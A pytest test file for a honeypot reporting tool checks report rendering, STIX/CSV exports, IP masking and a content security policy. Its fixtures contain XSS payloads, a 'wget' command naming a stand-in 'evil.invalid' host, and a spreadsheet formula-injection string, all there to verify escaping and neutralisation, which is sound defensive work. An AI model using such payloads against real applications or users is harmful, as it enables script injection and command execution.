"""Report + exports from a real database filled with synthetic data."""

import csv
import io
import json
import re
from datetime import UTC, datetime

import psycopg
import pytest

from honeylens.enrich.geo import Enricher, GeoInfo
from honeylens.reporting import exports
from honeylens.reporting.data import load
from honeylens.reporting.render import pct_change, render_html, write_all
from honeylens.simulator.synthetic import write
from tests.conftest import role_dsn
from tests.test_pipeline_db import END, ev, make_pipeline

pytestmark = pytest.mark.db


@pytest.fixture(scope="module")
def filled(migrated, tmp_path_factory):
    import psycopg as pg
    with pg.connect(migrated["admin"], autocommit=True) as c:
        c.execute("TRUNCATE honeylens.raw_events, honeylens.sessions, honeylens.login_attempts, honeylens.commands, "
                  "honeylens.downloads, honeylens.attack_matches, honeylens.session_summaries, honeylens.ingest_offsets CASCADE")
    folder = tmp_path_factory.mktemp("logs")
    write(str(folder / "synthetic-1.json"), 42, 14, END, 30)
    hostile = [ev("evil01", "cowrie.session.connect", "2026-10-04T09:00:00Z"),
               ev("evil01", "cowrie.login.success", "2026-10-04T09:00:01Z", username="<img src=x onerror=alert(1)>", password="p"),
               ev("evil01", "cowrie.command.input", "2026-10-04T09:00:02Z", input="<script>alert(1)</script> wget http://evil.invalid/a"),
               ev("evil01", "cowrie.session.file_download.failed", "2026-10-04T09:00:03Z", url="=cmd|'/c calc'!A1")]
    (folder / "cowrie.json").write_text("\n".join(hostile) + "\n")
    make_pipeline(migrated, folder).drain()
    with psycopg.connect(role_dsn(migrated, "hl_report")) as conn:
        return load(conn, END, 7, "all")


def test_report_sections_and_escaping(filled):
    import dataclasses
    d = dataclasses.replace(filled, commands=[{"command": "<script>alert(1)</script> wget http://evil.invalid/a",
                                               "times": 1, "sessions": 1, "mapped": True}] + filled.commands,
                            usernames=[{"username": "<img src=x onerror=alert(1)>", "attempts": 1}])
    html = render_html(d)
    for heading in ("Executive summary", "Where traffic came from", "Credentials and commands", "MITRE ATT&amp;CK",
                    "Notable sessions", "Indicators of compromise", "Defender takeaways", "Methodology and limitations"):
        assert heading in html
    assert "<script>alert(1)</script>" not in html and "&lt;script&gt;" in html
    assert "<img src=x" not in html
    assert "http://" not in html.split("<style>")[1].split("</style>")[1].replace("http://www.w3.org", "")
    assert "SIMULATED DATA" in html and "DATA MODE: SIMULATED" in html and "IST" in html
    assert "<script" not in html.lower().replace("&lt;script", "")
    assert re.search(r"vs previous week", html)


def test_week_over_week_has_both_weeks(filled):
    assert filled.totals["sessions"] > 0 and filled.prev_totals["sessions"] > 0
    assert pct_change(12, 10)["text"] == "+20%" and pct_change(5, 0)["text"] == "new"


def test_mask_ips(filled):
    html = render_html(filled, mask_ips=True)
    for r in filled.ips:
        assert r["ip"].replace(".", "[.]") not in html
    assert ".x" in html
    stix = exports.to_stix(filled, mask_ips=True)
    assert not any("ipv4-addr" in o.get("pattern", "") for o in stix["objects"])
    # IPs inside URLs and commands must be masked too, not only source IPs
    ipv4 = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
    raw_ips = {ip for r in filled.ioc_urls for ip in ipv4.findall(r["url"])}
    raw_ips |= {ip for r in filled.commands for ip in ipv4.findall(r["command"])}
    csv_text = exports.to_csv(filled, mask_ips=True)
    stix_text = exports.dumps(stix)
    for ip in raw_ips:
        assert ip.replace(".", "[.]") not in html and ip not in html
        assert ip not in csv_text and ip not in stix_text


def test_csv_injection_neutralised(filled):
    rows = list(csv.reader(io.StringIO(exports.to_csv(filled))))
    assert rows[0][0] == "type"
    values = [r[1] for r in rows[1:]]
    assert "'=cmd|'/c calc'!A1" in values


def test_stix_bundle_shape(filled):
    b = exports.to_stix(filled)
    assert b["type"] == "bundle" and b["id"].startswith("bundle--")
    ids = set()
    for o in b["objects"]:
        assert o["spec_version"] == "2.1" and re.fullmatch(r"[a-z-]+--[0-9a-f-]{36}", o["id"])
        assert o["id"] not in ids
        ids.add(o["id"])
        if o["type"] == "indicator":
            assert o["pattern_type"] == "stix" and o["pattern"].startswith("[") and o["labels"]
            assert re.fullmatch(r"\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\.\d{3}Z", o["valid_from"])
    report = [o for o in b["objects"] if o["type"] == "report"][0]
    assert set(report["object_refs"]) <= ids
    assert exports.to_stix(filled) == b  # deterministic


def test_navigator_and_write_all(filled, tmp_path):
    layer = exports.to_navigator(filled)
    assert layer["techniques"] and all(t["score"] > 0 for t in layer["techniques"])
    files = write_all(filled, tmp_path)
    assert all(p.stat().st_size > 0 for p in files.values())
    json.loads(files["stix"].read_text())


def test_enrichment_cache_roundtrip(clean_db):
    class Once:
        name = "fake"
        calls = 0

        def lookup(self, ip):
            Once.calls += 1
            return GeoInfo(ip=ip, country_code="DE", country="Germany", asn=3320, as_org="X", source="mmdb")

    e = Enricher([Once()])
    with psycopg.connect(clean_db["admin"]) as c:
        assert e.lookup("8.8.4.4", c).country == "Germany"
        assert e.lookup("8.8.4.4", c).country == "Germany"
    assert Once.calls == 1 and e.stats["cache_hit"] == 1


def test_report_cli(filled, migrated, tmp_path, monkeypatch):
    from honeylens.reporting.cli import main
    from tests.conftest import ROLE_PASSWORDS, _kv
    kv = _kv(migrated["admin"])
    for k, v in {"HL_DB_HOST": kv["host"], "HL_DB_PORT": kv["port"], "POSTGRES_DB": migrated["db"],
                 "HL_DB_USER": "hl_report", "HL_DB_PASSWORD": ROLE_PASSWORDS["hl_report"]}.items():
        monkeypatch.setenv(k, v)
    assert main(["--out", str(tmp_path), "--end", END.isoformat(), "--mask-ips"]) == 0
    assert (tmp_path / "weekly-report.html").exists()


def test_no_attribution_language(filled):
    html = render_html(filled).lower()
    assert "not attribution" in html
    for bad in ("attacked by", "state-sponsored", "hack back"):
        assert bad not in html
    _ = datetime.now(UTC)


def test_scheduler_runs_real_report_at_monday_slot(filled, migrated, tmp_path, monkeypatch):
    """The scheduler + the REAL report code + the read-only DB role, with a fake clock."""
    from datetime import timedelta

    from honeylens.reporting.cli import main as report_main
    from honeylens.reporting.scheduler import Scheduler
    from tests.conftest import ROLE_PASSWORDS, _kv
    kv = _kv(migrated["admin"])
    for k, v in {"HL_DB_HOST": kv["host"], "HL_DB_PORT": kv["port"], "POSTGRES_DB": migrated["db"],
                 "HL_DB_USER": "hl_report", "HL_DB_PASSWORD": ROLE_PASSWORDS["hl_report"]}.items():
        monkeypatch.setenv(k, v)
    now = [datetime(2026, 10, 5, 0, 29, tzinfo=UTC)]  # Mon 5 Oct 2026 05:59 IST

    def sleep(s):
        now[0] += timedelta(seconds=s)

    s = Scheduler("MON 06:00", "Asia/Kolkata", tmp_path, report_main, clock=lambda: now[0], sleep=sleep,
                  heartbeat=tmp_path / "hb")
    s.loop(max_runs=1)
    assert s.runs == [(datetime(2026, 10, 5, 0, 30, tzinfo=UTC), 0)]
    out = tmp_path / "2026-10-05"
    for name in ("weekly-report.html", "iocs.csv", "iocs.stix.json", "attack-navigator-layer.json"):
        assert (out / name).stat().st_size > 0, name


def _stix_validator():
    import importlib.util
    from pathlib import Path
    pytest.importorskip("stix2")
    path = Path(__file__).resolve().parents[1] / "scripts" / "validate_stix.py"
    spec = importlib.util.spec_from_file_location("validate_stix", path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_stix_normal_output_valid_with_stix2_library(filled):
    counts = _stix_validator().validate(exports.dumps(exports.to_stix(filled)))
    assert counts["indicator"] > 0 and counts["report"] == 1


def test_stix_masked_output_valid_with_stix2_library(filled):
    text = exports.dumps(exports.to_stix(filled, mask_ips=True))
    _stix_validator().validate(text)
    patterns = [o["pattern"] for o in json.loads(text)["objects"] if o["type"] == "indicator"]
    assert patterns and not any("ipv4-addr" in p or "ipv6-addr" in p for p in patterns)


def test_mask_ips_covers_urls_commands_without_db():
    from datetime import timedelta

    from honeylens.reporting.data import ReportData, Window
    end = datetime(2026, 10, 5, tzinfo=UTC)
    d = ReportData(window=Window(end - timedelta(days=7), end), data_filter="all",
                   commands=[{"command": "wget http://198.51.100.23/x.sh; ping 2001:db8::7", "times": 1,
                              "sessions": 1, "mapped": True}],
                   ioc_urls=[{"url": f"http://198.51.100.{n}/x.sh", "attempts": 1, "first_seen": end,
                              "last_seen": end, "simulated": True} for n in (23, 24)])
    html = render_html(d, mask_ips=True)
    assert "198[.]51[.]100[.]23" not in html and "198[.]51[.]100[.]x" in html and "2001:db8::7" not in html
    assert "198.51.100.23" not in exports.to_csv(d, mask_ips=True)
    stix = exports.to_stix(d, mask_ips=True)
    ids = [o["id"] for o in stix["objects"]]
    assert len(ids) == len(set(ids)), "masked URLs that collide must not create duplicate STIX ids"
    assert "198.51.100.23" not in exports.dumps(stix)
    # without masking the report still shows the (defanged) address
    assert "198[.]51[.]100[.]23" in render_html(d, mask_ips=False)


def test_masked_exports_merge_collapsed_urls_and_agree():
    from datetime import timedelta

    from honeylens.reporting.data import ReportData, Window
    end = datetime(2026, 10, 5, tzinfo=UTC)
    early, late = end - timedelta(days=3), end - timedelta(days=1)
    d = ReportData(window=Window(end - timedelta(days=7), end), data_filter="all",
                   ioc_urls=[{"url": "http://198.51.100.23/x.sh", "attempts": 2, "first_seen": late,
                              "last_seen": late, "simulated": False},
                             {"url": "http://198.51.100.24/x.sh", "attempts": 5, "first_seen": early,
                              "last_seen": early, "simulated": False}])
    rows = [r for r in exports.to_csv(d, mask_ips=True).splitlines() if r.startswith("url,")]
    assert len(rows) == 1 and ",7," in rows[0]
    stix = exports.to_stix(d, mask_ips=True)
    inds = [o for o in stix["objects"] if o["type"] == "indicator"]
    assert len(inds) == 1 and inds[0]["description"] == "7 attempts"
    assert inds[0]["valid_from"].startswith(early.strftime("%Y-%m-%d"))
    merged = exports.url_iocs(d, mask_ips=True)[0]
    assert merged["first_seen"] == early and merged["last_seen"] == late
    # unmasked: both URLs kept
    assert len(exports.url_iocs(d)) == 2


def test_masked_report_masks_ips_inside_credentials_and_takeaways():
    from datetime import timedelta

    from honeylens.reporting.data import ReportData, Window
    from honeylens.reporting.render import takeaways
    end = datetime(2026, 10, 5, tzinfo=UTC)
    d = ReportData(window=Window(end - timedelta(days=7), end), data_filter="all",
                   totals={"login_attempts": 3},
                   usernames=[{"username": "admin@198.51.100.77", "attempts": 3}],
                   passwords=[{"password": "pw203.0.113.9", "attempts": 3}])
    html = render_html(d, mask_ips=True)
    assert "198.51.100.77" not in html and "203.0.113.9" not in html
    assert "admin@198.51.100.x" in html and "pw203.0.113.x" in html  # the guess itself stays visible
    assert "198.51.100.77" not in " ".join(takeaways(d, mask_ips=True))
    assert "admin@198.51.100.77" in render_html(d, mask_ips=False)


def test_report_csp_blocks_base_and_forms():
    from datetime import timedelta

    from honeylens.reporting.data import ReportData, Window
    end = datetime(2026, 10, 5, tzinfo=UTC)
    html = render_html(ReportData(window=Window(end - timedelta(days=7), end), data_filter="all"))
    csp = html.split('http-equiv="Content-Security-Policy" content="', 1)[1].split('"', 1)[0]
    for directive in ("default-src 'none'", "base-uri 'none'", "form-action 'none'"):
        assert directive in csp
    assert "<script" not in html.lower()
